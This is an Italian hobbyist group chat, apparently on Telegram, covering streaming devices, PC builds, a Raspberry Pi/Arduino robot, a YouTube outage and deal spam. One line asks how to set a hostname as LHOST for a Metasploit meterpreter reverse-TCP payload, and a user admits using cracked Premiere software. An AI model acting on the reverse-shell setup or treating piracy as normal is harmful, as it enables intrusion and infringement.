è Marco che ieri ha tolto da admin metà gente per il 1 aprile 
ti dice qualcosa oppure non pubblica e basta?
Ecco 
non pubblica e basta vabbè risolviamo stasera o domani, sto uscendo
risolviamo appena Marco legge i messaggi 
HAHAAHAHHAHAAHA guardate il primo risultato
Loool
Emammamia
Devi capire che per scrivere :q ci vogliono 27 lauree in ingegneria aerospaziale
non solo
anche una in astrofisica, così aiuti Arco
Ahahahah
Comunque vuol dire che l'hai cercato
E il primo è il mio prof di sistemi se ricordo bene
Aprile:
Cominciano a registrare Stranger Things 3;
Domani pubblicano Tokyo Ghoul :re in Giappone;
Il 7 aprile esce la 3 stagione di Boku no Hero Academia;
Escono robe.
Quanto bello è sto mese (tranne che tra meno di 2 mesi ho gli esami)
FOTTE SEGA IO VOGLIO 13
Cos
La seconda stagione
Di cosa
Eh ma sei tardo?
L'ho scritto!
Cosa
Tredici
Kernel panic
È una serie
Alleluia
Aaaahhh
 ci servivi tu
Della quale conosco solo l'immagine di copertina
E io ti consiglio di vedertela
Preferisco non iniziare a guardare niente
Perché poi diventa una droga
Eh
E si tradurrebbe in meno Switchando e meno Drahy per voi
Severo ma giusto
Però 13 è obbligatoria
Veramente
Ti fa pensare
Raga ma guardatevi Death Note
Come piace a me!
A caso
Il film dici?
NO
Quello saltatelo
Ahh
Ti sei salvato in calcio d'angolo 
L'anime o il manga
 is your friend
saaaaad
Saaas
Comprerò Netflix solo quando diventerà serio a livello Anime
Purtroppo sono un otaku-nerd- hikikomori

(Che poi perchè purtroppo, ognuno è libero di far ciò che vuole)
ossia dopo gli esami?
(Uscendo dall'off-topic) Per Netflix, youtube, ecc... Mi conviene comprare una chromecast o un raspberry pi 3 b+ con android Tv?
Probabile
in realtà un chromecast ma il mio cuore va per il raspberry, che poi lo puoi usare anche per altro probabilmente
A quel punto conviene il Chrom, per il rasp da queko che ho potuto vedere lagga
Spoiler: non comprerei mai Netflix per non uscire quei soldi
 is your friend
lagga? beh effettivamente non è fatto per lo streaming🤔 beh allora si va di chromcast nel dubbio
2.50 al mese...
Se lo dividi
Basta vedere i video su YouTube
Eh perché non lo dovresti dividere?
Io vedo ogni contenuto Netflix su Chromecast, mai un problema
La chromecast ha un os basato su android giusto? Quindi ha il play store?
non ho un chromecast ma mi sembra di si
E streamma a 1080p 60 fps? Richiede alimentazione esterna? (Scusate le domande, vorrei valesse l'acquisto)
Stiamo parlando di rasp
Perché magari il resto già lo ha?
mai usato VIM in vita mia
Eeeeeehh non ci credo che lo hanno tutti i tuoi amici
beh io di certo
A meno che non hai 3 o 4 amici 
Siamo 551 membri ma alla fine scriviamo max in 30
Chromecast
e poi ci sono io che sono qui 24h ._.
Come usare il tempo libero 
sono qui proprio perchè non ne ho di tempo libero
🤔
mentre studio sono qua io, giusto per far finta di studiare
Mi sfugge la logica
Kernel panic
Blue screen
Aaah chiaro
In pratica ti compri gli esami?
Ah ma siete all'università?
Non credo
3 media
io sono al liceo
Eh infatti
aa......parli degli esami di terza media te?....ha..haha...ha
Quando sei l'unico 14enne in mezzo ai 20enni
No vabbè scherzavo sul fatto che ti compravi il punteggio all'esame di maturità
cosa centra
gli esami di terza media non c'è da studiare, vai tranquillo
ArcoBaiterLaughMode: ON ✅
,,,,,,,,,
Credimi, quando vai a un liceo...hanno i soldi
Io: Ok capo, grazie del consiglio
A giugno
Io: *inspira, ok sono pronto
Esaminatore: Buongiorno, ci parli della 2 guerra mondiale
Io: cos
Quanto sn sympa
ti da 9
e non sto scherzando
Uauu
Io devo avere almeno 9 altrimenti i miei mi mettono in piedi su una sedia, mi attaccano il collo al soffitto con una corda e levano la sedia (detto in modo esplicito)
Un po' esigenti
haha, che bello il liceo, prendi 2, non ti dice niente nessuno :D
Uauu ch belo
perchè è la norma :D
Sei di aiuto grz
Quanti siete di Padova?
O ci vivete (come me)
prg
viiiicenzaaaa
Oke
Treviso figa
E casa di carta il 6 aprile
Ti capisco
Buongiorno!
Scusate se vi disturbo! Per caso qualcuno sa come posso usare un histname in LHOST di meterpreter reverse tcp?
È che 
 
 
  
 e non so chi stanno organizzando qualcosa alle mie spalle
E fanno bene 
Non è vero 
ma hahahaahahahahah ❤️
era ieri, ormai non è più il 1 aprile
Ahahahahaga
Però il gruppo esiste ancora
E tu lavori ancora su github
anche gruppoDoveSi[...] esiste ancora sebbene fosse nato per sistemare il nuovo canale di overVolt quando era morto
AHAHAHAHAHAH 
Il vecchio impianto domotico di 4 anni fa
Io ne voglio fare uno uguale
La domotica sta morendo
Bravo, fai le cose per bene e non fare come fanno ora
Io non vedo tanti la necessità di domotizzare  sinceramente
Lo sai che io sono studiato 
Più sicurezza, più comodità e maggior risparmio
Anzi, nel mio caso molto risparmio visto che lascio sempre tutte le luci e la TV accese perché non ho sbatti di spegnere
In che senso?
Basta non accenderle proprio e usare il sole xD
Che ormai si parla di IoT, ovvero apparecchi che lavorano ognuno per conto suo, non comunicano tra di loro e si connettono a server esterni mettendo a potenziale rischio la tua privacy
Che sbatti, 50 applicazioni diverse magari
Ragazzi, ho bisogno di una mano
Esatto
Chiedi alla mano della giustizia
🤚
Fatto
Lol

Filippo è entrato solo per questo
Senza offesa per la mano ma non credo sia competente in quello che sto per chiedere

Non è proprio il massimo... Ma è più plug&play e più accessibile a tutti
Secondo me dovresti diventare un illustratore  per come disegni bene
Proprio 
Abbiamo bisogno di una leggenda per leggere questo disegno
Hai ragione, è di bassa qualità...a 120p

Cioè che leggenda?
Secondo me ti fai troppi film mentali
Si, decisamente
 qualcosa da dichiarare prima di essere messo al rogo?

Sarebbe stato più bello se il numero di partecipanti fosse stato 555

Adesso invito i miei genitori e i miei nonni e siamo a 555
IoT lo possiamo considerare come la domotica aggiornata. Secondo me sono molto più comodi dei sonoff sparsi per casa che fare una centralina con i relay e tutti i cavi che scorrono nei muri. Riguardo la privacy ormai non esiste più. Un esempio? Gli smartphone hanno i sensori di impronta digitale, secondo te quella tua impronta sara solo nel tuo telefono? Quell'impronta sarà salvata in vari server di polizia e altre cose. Ormai siamo completamente schedati.
Ma che dici, l'impronta digitale rimane nel tuo telefono e basta
E utilizzando uno smartphone la tua privacy rimane più protetta di quanto tu possa pensare
marco questo è quello che ti fanno credere. Come puoi dimostrare che l'impronta rimane nel tuo smartphone? Oggi in questo mondo siamo schedati al 100%
comunque cambiando argomento come mai non vendono il chromecast su amazon?
Perché c'è scritto nel contratto
Perché nessuno comprava il firestick
chromecast vs firestick?
Già
nono intendevo quale dei due è migliore
Già
adesso dove posso comprare il chromecast
?
Su 

grz
Lol
Perché esiste una legge che obbliga a rendere consapevole l'utente DI TUTTO
Perché Amazon e Google sono come i bambini, "hanno litigato e adesso non si vogliono più vedere"
Se per questo Amazon non vende nemmeno Google Home (che forse mi comprerò nonappena sarà più funzionale in Italia)
Con raspberry non si riesce ad emularne tutte le funzioni.. vero?
No, è ancora una developer preview quella per Raspi
E secondo me la versione finale dell'API di Assistant non sarà gratuita com'è ora.
Che licenza ha?
Non è open source l'SDK di Google eh
Solo l'implementazione in Python è su GitHub sotto licenza Apache 2.0 (APL 2.0)
Ok boh speravo si riuscisse ad emulare completamente
Quell'API serve più che altro ai developer per provare le loro app su Actions On Google e per progettare dispositivi con Assistant integrato
Infatti c'è qualche speaker non di Google compatibile con Assistant
E a quel punto hanno a disposizione l'sdk?
Top
Non posso farlo
Dove?
Cittadella
Ma tu non sei il cugino?
Lol 
fiero
Choosing an OS



by 
Io non la ho la vita infatti
Non mi uccidete, ma che è il secondo da sinistra, quello con l'icona di chrome?
Google Chrome... Google chrome è per i fighetti :p
Ma non è un os
Si ma non volevo rispondere seriamente
Chrome OS
Si chiama Chrome os cmq
Lol
Io ho elementary 
Praticamente è una distro linux base gentoo con solo google chrome
...
Ti sei dimenticato una cosa
E dilla tu 
Hai messo due parole insieme che si picchierebbero di botte
Google + gentoo (open)
In poche parole l' os di Google...
Il male assoluto, che Dio ci liberi
Come grafiche mi piacciono
Si
Vi vedete sempre allora 
Bhe
Bhe nsomma
Invece l'ultimo? 
Beh
E che ti posso fare
Uccidetemi
Gentoo masterrace
Il progetto è open source è 
Il problema è Google
Finalmente android oreo
Su che dispositivo?
S8
Ancora adesso?!
P10 lite?
lol
Comunque non capisco come funzioni il nuovo progetto "Notification Channel" su oreo... forse non è ancora stato implementato
hahaha, sono indietrissimissimo con i tempi
Tutto questo odio non lo capisco
Non è odio... peggio
Xiaomi regna 

Al mio amico con s8 è già arrivato da un po'
Chi regna allora?
e chi ha detto di no?
La tua scimmia 
beh xiaomi fa le cose più disparate oltre ai telefoni
ma
Xiaomi Regna.
adesso ditemi se trovereste un modo più intelligente di fissare sta telecamera
Trovami un telefono migliore di Xiaomi mi A1 subauekks fascia Di prezzo
?
Redmi note 5
Bella connessione

Lol
?
cioè
usa dei fili di rame, non si sa mai
No google the beaaast
però regge 🤷‍♂
Cossa è
se fosse stato per me li ci vedresti 2kg di scotch carta
Hai ragione...the best tracciatore di attività al mondo
e quindi
Un robottino a due ruote fatto con raspberry
Madonna, adesso ti picchio
what's the prob man
ULTIMI PEZZI
⁣ Xiaomi Mi Air 13 

✔️ i5-7200u + 8gb Ram
☑️SSD DA 256GB
Scheda Video GeForce MX150
☝️Con sensore impronte

➖MAGAZZINO CINA➖
DA GB ITALIA2 ANNI GARANZIA
 Prezzone di 623€
✅ OFFERTA LAMPO

 Acquista 


 ITALY EXPRESS NO TASSE
Va beh così mi ricorda se sono regolare quando vado in bagno
Vi picchio tutti
Ma lo posso fare con orange pi? XD
Neanche io trovo il problema
sei troppo fissato te
Prendete tutti troppi sotto gamba la privacy
Forse 
Privcy
beh se ha i gpio (che ha) si
Che ci possiamo fare ormai
Vediamo...fare attenzione a dove lasciano i nostri dati, capire le priorità, scappare da big G
sai quanto me ne frega della privacy, finchè ad ogni mia ricerca mi chiede se ho sbagliato e volessi cercare "gattini coccolosi iutub", a me sta bene
Io mi uccido...
cosa c'è di male se loro hanno informazioni su di te?
mica te le usano contro in alcun modo, e manco le rilasciano a nessuno
nel senso...sempre anonimamente se le rilasciano
Si uccide veramente in 3 2 1
è un robot, mi serviva fissare la Pi Camera e.... ecco
funzica? che ci fai con quel robottino?
non sai che soddisfazione, fissata così alla cazzo e fa le foto drittissime 
anyway, è un robottino con 2 motori controllati da un Arduino, connesso anche a vari sensori. Il raspberry invece deve (o dovrebbe, devo ancora mettermi con OpenCV) mappare tutta la casa, capendo quali stanze ha già fatto e quali no
oppure potrei far inseguire al robottino un oggetto, devo vedere
DAMI A ME OPENCV CHE FACC IO CHE TU NN SEI CPC!!!11!1!
comunque un raspi su un robot è troppo comodo, ci puoi fare di tutto
beh in caso stavo proprio pensando di chiedere a te 
a già, pensaci tu a installare opencv però
io me lo sogno di notte
pip3 install opencv-python-armv7l
hahaha, sarebbe bello se funzionasse
🤔
a e se usi python....beh devo riguardarmelo, io so opencv per cpp, non sono molto diversi però vabb
eh col raspi mi tocca usare python
beh anche cpp puoi usare
mi tocca perchè ho già due script in python
basta che compili
lo sapevo che lo stavi per dire ❤️
per fare cosa? inviami tutto il progetto in pvt
al massimo converto tutto in cpp
ma giusto per evitare 
domani, non c'ho voglia stasera 
kk
Ragazzi io ho provato a installare opencv il problema è che lo scarica per python 2.7... come faccio a scaricarlo per python 3.x
Per quanto preferissi cpp... qui sono costretto anch'io ho il resto del codice in python
hai fatto pip install cose?
basta che fai pip3 install cose
Potrei quasi essere interessato pure io 
Devi installare il .whl per Python 3.x
I Think
vabbè, ho capito, creo un repo github così Giulian mi può dare una mano e voi potete sbirciare 
Video collaborazione von marco
Ho provato non va
mmm 🤔
sai che sarebbe un bel progetto? gli passo il codice, la telecamera se la fa inviare... good 
Per python 2.7 funziona però 
Nono lo devi fare te
Troppo lavoro gli laaciate ahahah
seeh chi ci va a Trento 
Mai sentito di un .whl
Come se non potreste farlo su skype xD
eh ma è più figo essere in loco
Con 
 non erano in loco ed è venuto cmq un video godibile
 a me funziona
pure a me, ma su un altro gruppo c'è un altro tipo a cui non va
Pesce d'Aprile
A me funziona sia da pc che da cellulare
A me funzia
un po' in ritardo 
Io faccio il 2 d'aprile
Raga ma quello è un codice in base 64?
Ora ho letto il messaggio ahahahahahah
Qua siamo in tre a cui non va
Beh, penso che sarà un codice d'errore
  tranquillo ti hanno bloccato ip, agli altri non è down YouTube
A me non funge da due ore, ma solo i canali, i video vanno
Tranquillo ti hanno bloccato ip non è molto rassicurante
Aprite overvolt
Dà 500
WTF
Non siamo solo noi
Non dovrebbe, è un 500 (Internal Server Error), vuol dire che si è verificato un errore nell'Applicazione da parte Server
raghi mi è sorto un dubbio: posso alimentare Arduino tramite il pin Vin a 7.4 volt?
È vero 
non usano nginx 
No ok tutti i canali
Vanno i video ma non vanno le pagine dei canali
^idem
Non solo il tuo menomale
ecco
E niente, qualche scimmia ti avrà tolto dalla table 
 per sbaglio per fare debug
Ah ecco
Esatto
500 è da protocollo per forza lanciato da un errore interno dell'applicazione
A me non va
Prima stavo provando ad aprire un canale e non andava
Da cellulare funziona tutto bene
 e siamo in quattro
Neanche con l'app va

da me no
No neanche a me ahahahha
Mi sono sbagliato
Se non funziona, e l'endpoint è sempre lo stesso per tutto il mondo, allora son problemi di YouTube
RAGA HO RISOLTO A CASO
dafq
Basta inserire un numero a caso in "pbjreload"
È down un po' in tutto il mondo
Mi spiace non funge
Anzi, valori a caso quanto noto
Nel frattempo compro questo su banggood?
Figo assai
Va solo il canale di Blink
Che raccomandato
Neanche casey va
Mk e SpaceX sì
a me funziona tranquillamente
Si
Apri la pagina di un canale
ah lol
pensavo fosse tutto YouTube
Nope
non va
blink invece si
Traversy 
how much?
Manco Linus :C
20
Ok, piano piano stanno riprendendo tutti
niente male🤔
io intanto cazzeggio su MIRC
ancora esiste?
Avoglia
Alcuni canali sono ancora down
Rulof è down
in tutti i sensi mamma che odioso
AHAHAHAHAH
Era bravino tempo fa ma ormai
Eccolo sul server di oce@n
Proximity è online. A posto, ho tutto quello che potrebbe servirmi questa sera.
"highly trained monkeys"
❤️
Proximity?
Sapete se alimentando Arduino a 7 volt tramite Vin si brucia o va bene? 🤔
Secondo me brucia
non mi ricordo se supporta da 9 a 16 volt o da 5 a 16 volt
Lo sentirò, grazie
Sei al limite inferiore ma dovrebbe andare mi sa
meglio che controllo, valà 
 il tuo PC quanta RAM ha?
Vała si scrive con la Ł, non hai la SwiftKey in Veneto? 
4gb ddr3
quello fisso quanta ne avrà?
16gb 3200mhz rgb
wooow
RGB
tamarrata assurda
Da upgradare a 32 il prima possibile
+40 fps minimo
Ecco
Ci giocherai ad universe sandbox a 26fps poi
comunque, marco, sei felice? tra massimo 1 settimana ti arriveranno sul referral la percentuale di 700€ di acquisto
io ho 16gb 3000mhz non rgb infatti faccio meno FPS
io ne sto prendendo 8 :I
Manca il colore, no colore no putenza
❤️
l'rgb fa lavorare meglio i cinesi che stanno dentro il procesore
non lo sapevi? 🤔
in futuro mi salverò con l'hue+
o nella gpu
ahahahahah
Anche il kraken, la GPU e il case sono rgb comunque
Lo ho già integrato nel case 
tamarro +999999999
Eh la madonn 
Modalità giostre
Io se mi faccio il fisso al massimo prendo tutto classico e ci metto 3 metri di striscia led rgb aggrovigliati dentro, altro che ram
exatto
quando fai una festa al posto delle luci metti il pc
come farò io

PC che pagherai quanto un ifone ics11!
Il primo ubriacone poi lo scambia per la console da dj e comincia a far girare le ventole come dischi
Steve Jobs è deluso11!
poi dato che sono povero mi devo accontentare di un CM nepton 240 che però mi tiene la cpu IDLE a 20 gradi
AHAHAHAHAHAHAHa
poi partono le bestemmie venete perchè te ne ha fatto partire il dissipatore di GPU e CPU ma vabbè
dettagli
Ha staccato il dissipatore per usarlo come cuffia
esatto
Lol
Eh ma i led rgb dell'hue sono controllati tutti singolarmente
e il contenitore del liquido per bere rum
Quindi può fare le waves di colori
Le schede video costano troppo ora

devo vendere un rene per una 1080ti
Bhe ci sono le strisce led fatte così
avevo accumulato 700 euro
Ws2812b
Sisi è che costano di più, e 3m non li trovi
CPU?
Sono quelle I²C
come hai fattooo
e sarò costreatto a pigliare una 1080 sovraprezzata
al  quadrato
oppure aspettare la prossima serie
Tieni premuto il 2
che processo cesso hai?
ah, ok
Almeno con la Gboard si fa così
i5-7600k
io ho gboard
ah, io con un i5 7500 prendo una 1050 ti
da 4gb
io aspetto la prossima generazione
costano troppo
vuoi prendere una scheda video op con un processore medio?
si perchè in futuro faccio upgrade alla CPU
ok
andrai su un i7?
sisi
e cambio forse anche mobo
raga, ma mi conviene prendere una 1050 ti da 4 GB al posto di una 1050 da 2
oppure 16gb di RAM al posto di 8
?
o scheda video o ram
se devi giocarci 8gb vanno ancora bene
ok
sisi
lo uso per giocare e prpgrammare
almeno non lagga Android studio
si dai vai con la 1050ti
quindi opto per la GPU?
okok
poi se inizi ad editare seriamente devi andare sui 16gb
nono
e per un anteprima fullscreen direi una 1070 per un 1080p
l'editing non fa per me
ok allora vai tranquillo con 8
al massimo video per i compleanni 🤣
Ahahahahah io esagero con quei video e creo certi capolavori

a me è piaciuto come è uscito quello per la pensione della nostra prof di tecnologia
ricordi 
?
mi piglio la briga di animare frame per frame per creare l'effetto "YTP"
ad ogni compleanno tiro fuori qualcosa di nuovo e soffocano dalle risate
37gb il tutto.... manco la cartella dei """"""""""""compiti""""""""""""
nice
faccio tutto con premier 2018
idemm
puramente craccato
Ahahahahah stavo per dirlo
neanche a me vanno i canali yt
La metà del lavoro l'ha fatta Avicii di sottofondo
esattamente
Lol
la canzone è una parte importante
700€ che cazzo hai comprato?
pc
seeeee
primooo
vabbò, vado a dormire
notte a tutti
dato che ho fatto anche corsi di produzione faccio tipo i remix ed escono delle meme che il giorno dopo in classe ti lascio immaginare

Notteeeee
Raga come faccio a creare un access point su linux
Con password wpa2
e da dove la pigli la connessione?
Senza, mi serve solamente con access point
ah capito in stile honeypot
in questo momento non ricordo ma sono certo che si possa fare
vedrò stamattina
Ok poi taggami
ok
a domani
notte a tutti
Notte
Su p10 lite è uscito oreo?
Forse
Credo di si
Ragazzi domanda per chi ha una stampante3d, quando stampate dopo aver lasciato la stampante inutilizzata per un po' di tempo notate cambiamenti nella qualità di stampa?
Io al momento ho lineage OS sul mio p10
Dici che l'aggiornamento posso farlo lo stesso? O devo aspettare che facciano la ROM oreo?
A me no
Non saprei dirti
Al mio amico si
Sarà che è brandizzato wind
So che c'entra il paese d'origine del telefono e il modello
Tipo was-x1 arriva prima di was-l1
Ecc bravo
NO
ma... mi tocca usare un'altra batteria solo per l'Arduino :(
il robot pesa un po' troppo con 2 batterie al litio, un powerbank e un'altra batteria per Arduino
ma usa una batterietta da 3.7v, le sottilette che trovi in ogni cosa tu possa comprare dai cinesi
c'è, prendi una spugna e dentro c'è quella batteria, è proprio un dato di fatto
non penso duri tantissimo per 2 motori 
ma i motori li alimenti direttamente dall'arduino?
a fac, invia tutto il progetto che almeno ci penso su
power bank per raspi
2 batterie al litio in serie da 3.7v l'una per i motori
e qualcos'altro per l'arduino
al massimo si fa una tesla da 2 metri solo per alimentarlo wifi
hahahaahahaahaha
in pratica il raspi preleva i dati e calcola tutto, l'arduino legge dai sensori e invia al raspi, poi il raspi dice tutto all'Arduino e lui comanda il driver per i motori
poi quando mostri il progetto a scuola se ti chiedono quanta corrente consuma tu gli rispondi "80 volte più di quello che serve" con il pollicione proprio
Ma l'hai costruito tu il Robottino?
2) Hai utilizzato I²C per farli comunicare?
mmmhh....ok....che ingroppo però.....ok, come invii i dati al rasp? nel senso, pin digitale giustamente, come fai? hai crittografato l'invio dati o altro?
HAHAAHAHAHAAHHAHA vero
yup
devo ancora finire di costruirlo, alla comunicazione penso dopo
==non hai idea di come cazz fare vero?
a quella penso io
però potrei attaccare l'arduino al raspi tramite USB, così non mi serve neanche la batteria e si parlano tramite seriale
beh anche
solo che è grossissimo il cavo
lo tagli
Poi consuma un Botto de corrente
usi un piccolo hub usb di quelli nano da 2 euro al massimo
si ecco, essendo che già il raspi che è alimentato con 1A e la telecamera soffre di suo sarebbe meglio evitare
beh dai, si trova una soluzione poi
limoni 
Seriale?
della serie che il robot è seguito a ruota dal camion del fruttivendolo
cosa?
ma a sto punto attaccagli un motore jet e via

Farli comunicare da Seriale tenendo le due alimentazioni separate?
Ma non potresti farlo solo con rasp?
asp...il rasp ha dei seriali?
++
Almeno credo, da quanto ho visto
c'è in realtà andrebbe bene anche attaccare ad una usb del rasp i 2 seriali dell'arduino, tx e rx no?
o...si....gpio 14 e gpio 15, sono dei seriali, basta attaccarli ai tx e rx di arduino ed è fatta :D
anche se io pensavo più ad una cosa del tipo : attacchi un gpio ad un pwmout dell'arduino e ti metti a parlare via codice morse
Con uno a 5v e uno a 3
mmmhh....non ci avevo pensato
._.
beh....effettivamente....mmmhh...non lo so
uhm...
Basta solo un partitore di tensione eh, puoi compattare il tutto e impacchettarlo con una termorestringente
ma per quello che mi serve basta che si inviino acceso-spento come status
mmmhh...ok
si no ma il problema è che arduino è 5v e il rasp tiene segnali fino a 3.3v
a dire il vero non so ancora cosa ne farò del raspi...
se invio un 3.3v arduino si accorge lo stesso che c'è corrente 
hey hey, usiamo direttamente il mio amplificatore che deamplifica
 però non so come funzichi il seriale mo'
non puoi scegliere il voltaggio in output, non hai un analog out sul rasp
va a finire che li attacco alla usb seriamente
comunque rasp —> arduino ci siamo, si può fare, arduino —> rasp invece è un pelo problematica la cosa
eh appunto
ma forse mi basta da rasp a arduino
devo proprio ancora decidere per cosa userò il raspberry, magari gli farò seguire un oggetto e allora deve parlare con arduino, se magari lo uso per fare un video a caso non mi serve che parlino
ASPÈ
sul raspi gira Processing 
no ma sai come fare? fai così, prendi un cavetto usb, lo tagli fino che ti basta giusto per occupare poco spazio, attacchi ai cavi seriali i tx e rx di arduino ed è fatta
right
ma basterebbero due cavetti di rame e una usb
ok devo decisamente trovare un cavo usb da stuprare
yeeep
io ne ho un po' :D ma non ti assicuro che funzionino senza esplodere accaso, potrebbero inoltre provocare ustioni al contatto
Ne ho uno
e sono del dopoguerra....spero
caricalo su gith... ah no
neanche a farlo apposta, addirittura già spellato 

potrei sfruttare quel ground per non dover tirare un jumper dal raspberry all'arduino solo per fare gnd comune
e ora... chi è il TX e chi l'RX? 
Usi la usb del rasp con la usb di Arduino asd
emmhh.....SI
per me cipolla
Non devi usare per forza i gpio
è quello che voglio fare infatti, ma adesso devo capire chi dei due è il TX
Qualcuno di voi sa come diventare volontario Telegram
coooosaaa?
anche per rpi3
Non serve a niente, l’ho provato tra due pc nella stessa lan collegati col cavo e lagga da paura
dipende dalla connessione
yeee modalità Woodstock manca soltanto quello che rolla le canne e Jimi Hendrix che brucia la chitarra🤣
occhio con quel Seidon, quei tubi sono difettosi
Pacchianissimo
ma serio, mamma mia..io odio quei cosi luccicosi, per me solamente schede madri classiche (possibilmente nere), ventole Noctua, dissipatori ad aria seri (Noctua, Be Quiet oppure Scythe) e led disattivati
Esatto. Il tutto con meno fronzoli inutili possibili
Il bello è l'utile
idem sui portatili..per me solamente Thinkpad, Dell e Santech..tutti smontabili e apribili completamente..assolutamente no portatili sottiletta e incollati, per il peso si risolve con un buon zaino
Ma collega Arduino e rasp direttamente usb usb
il raspi non ce la fa a dargli abbastanza corrente e il cavo pesa troppo
 nel frattempo che costruisco il robot tu potresti fare la parte di OpenCV in cpp... cosa gli facciamo fare? 
Ma hai provato ad alimetarlo con 7V?
nope, devo cercare su internet se gli va bene
creo la repo e lo faccio
che robot devi fare?
un robot intelligente col raspberry
Reti neurali? 
è quello che progettavo
Qualcuno di voi bravo in fisica?
però non mi vengono idee su come unire una rete neurale e un robot che va in giro
io e 
 
Devo fare 5 problemi e ne son riuscito a fare solo uno
io ovviamente sono molto più bravo di Cicca
Ahahahaha
Su cosa?
Leve e forze
Spara
È Easy, crea un 
 che si evolve
Dal 5 al 8... Il 4 lo son riuscito a fare
Ti scrivo in privata però
il 5 è piano inclinato
abbastanza easy :)
eh sì ma: per cosa lo uso poi?
volevo creare un robot per la rescue maze ma è un po' incasinato
noooi
un robot che ti porta birra e telecomando sul divano

aiuteresti l'umanità intera
Uh
sai quanta gente muore ogni giorno perchè non riesce ad arrivare al tavolino dove c'è telecomando e birra? 🤔
 passami i bracci del tuo robot rescue maze, mi servono 

 dimmi come ti chiami su github che ti aggiungo alla repo
Robot rescue maze?
btw, se volete è su 

Il robot che gli porta la birra si chiama "mamma"
Aaspetta...e chi se lo ricorda
vorrei farlo, ma è un pelino complicato
anche se avendo una pi camera sono molto avvantaggiato
No ok, parlavo del robot di marco
Wait a minute, trovi il mio nome basta che cerchi microscope webcam e credo sia computermaster qualcosa
ah haahhaaahhah
Add me ._.
computermasterpvp?
Probabile
noto che il codice del bot è molto organizzato 🤔
se vuoi... cosa vuoi fare? 
ah cazzo devo pushare
Ma è un progetto in Python?
github = pornhub per devloper giusto? 🤔
AHAHAHAAHAH
Se è sì ti posso dare tranquillamente due mani
facciamo 4
Oppure andiamo avanti a Pull Requests
non so, mi serve una mano solo nella parte del raspi, quella "intelligente", ma dobbiamo decidere cosa fargli fare
baby monitor
wifi pineapple su ruote 
un qualcosa che capisce se un oggetto è brutto o bello e ci mette le facce dei meme
per dare un feedback
Drake Circuits



by 
tipo ste facce

un robot che "produce musica"
sarebbe una bella impresa
Andrew Huang ci ha fatto una canzone intera con le Reti Neurali
Con la collaborazione di Google
ah
allora uno che la suona(?)
ok, scherzo
Se levassimo il fattore "Deep Learning"?
e
appunto

sad
Io posso aiutare con la Flask App e la comunicazione RealTime con SocketIO
e il raspi cosa fa? 🤔
IDEA
intellij
2017
Java ide
un robot che va in giro per la casa, mappa la casa e uploada tutte le informazioni su un sito
che fa mappatura 3d con Kinect?
non ho il kinect, una pi camera va bene uguale? 
siiii 
ci fai le robe in 4D, altrochè
e se facessimo l'ennesimo gruppo? almeno non spammiamo qui
Se creassimo un ennesimo gruppo per questo ennesimo progetto?
HAHAAHAAHAHAHAH prima io ._.
siiiiii
telepatia portali via
E aprite la parte forum progetti nel blog
good idea 
 ho ordinato il mi band dal portale italiano. perchè dice chinese version?
grz
Perché è la versione cinese... Mica sullo store italiano vendono solo roba italiana
Trovato nulla?
cosa ti serve gabrix?
Creare un access point su linux
Con password wpa2
mhh...
avevo visto qualcosa ma era molto incasinato
hostapd
Raspberry

 ‎So‎lo‎ €‎16‎.98
 

Non siamo casalinghe romboli!
Come no
Parla per te 
Io adesso metto a fare il soffitto, poi stendo i panni e metto la lavatrice e nel frattempo spazzo in soggiorno
Il tutto mandando buongiornissimi a tutti
Ahahahahahahah
Si ma a Marco non può non interessare con tutto quello che rovescia sulla sua scrivania durante le live 
Siamo messi bene 
Come te ne tiene
Tu non hai idea di com'è ridotta cara sua sua
Io mi son alzato, ho fatto colazione e sto a tavola a fare i compiti
Per questo ci sei tu che la sistemi
Uhm... Non mi ha ancora assunto
Vuole il curriculum?
Le immagini sono censurate perché potrebbero destabilizzare qualcuno
Esatto
Lol
Per raggiungere la scrivania bisogna scegliere se calpestare vestiti, scatoloni, cavi o oggetti non identificati
Zitto che meno di due giorni fa per entrare in camera mia avevo una cosa del tipo 30 vestiti, 2 jeans, 20 calzini, tutti per terra
Facevano tipo il muro di Berlino per entrare in camera mia
Ecco
Eccomi

 ‎€6‎14‎.9‎6 ‎in‎ve‎ce‎ c‎he‎ €‎10‎00‎.00
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎8.‎50%
⭐️‎ 5‎.0‎0 ‌‎/‌‎ ‎5.‎00‎ (‎20‎5 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 Store: Banggood (senza dogana)
 

issimo*
diciamo
Salve
Ciao
Devo acquistare un audiotecnica at2020 dal valore medio di 110 euro, e ho trovato un annuncio su eBay che lo vende a 30 euro
Guarda i feedback
Sembrano positivi
100% positivo con 93 vendite
Va bene
Mi fido allora
Più che altro il prodotto
Cerca recensioni su quel prodotto
Magari è una cinesata
Il microfono è il più venduto ed usato dopo il blue yeti
Per quello sembra strano stia a 30 euro
 ho visto per ubuntu ed è possibile ora sto cercando per raspberry

serve hostpad
mi informo e ti faccio sapere
E dnsmasq
si
stavo leggendo quella pag.
solo offerte che interessano ai makers

 ‎€1‎.8‎8 ‎in‎ve‎ce‎ c‎he‎ €‎2.‎86
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎4.‎27%
 Store: Banggood

Erano nella homepage di offerte Banggood, non so cosa pensare 

 

Ma esistono seriamente?
si
Bho non penso
Ha anche un neo
io mi sparo
Pensavo fosse qualcos'altro


Aspetta, lo deve far carburare quel mezzo neurone dedicato all'informatica
Semi di MELONI 
I Photoshop fatti bene
gg 
Nn m rbbr l btt
Aggiungi le vocali
ah ecco

chi di voi è brevo con audacity in 5.1?
io lavoro con Audition 2018
però ho usato audacity per anni quindi dimmi
forse riesco a rispondere
ho un impianto 5.1 a casa e sto facendo un test per le casse con la mia voce "cassa sinistra, destra, centrale ecc.", ho estratto il progetto sia in flac che in wav e il pc suona su tutti e 5 i canali (nel canale del sub non ho registrato nulla) ma quando lo riproduco sia dall'amplificatore che dal nowtv box con l'ampli in modalità direct suonano solo le 3 avanti
c'è un modo per codificare l'audio in dts?
leVocali = [a,e,i,o,u]
Uuuuh bestemmia

SEMI DI ZUCCA A MAMMELLA SENO MELONE VIETNAM ORTO VERDURA 10 SEMI RARI VG108 | Giardino e arredamento esterni, Piante, semi e bulbi, Semi e bulbi | eBay!

sisi sto leggendo
ah ok
ok
l'ampli quindi è 5.1
ovvio
ha tutti i canali separati
i blue-ray in 5.1 funzionano quindi è sicuro che funziona
ok
te l'ho chiesto perchè un po' di tempo fa su ebay girava una truffa di un ampli 5.1 che all'interno collegava i canali ad un finale stereo. faceva parte del white van scam
quindi funziona
io mi sparo
2018
noh vabbe
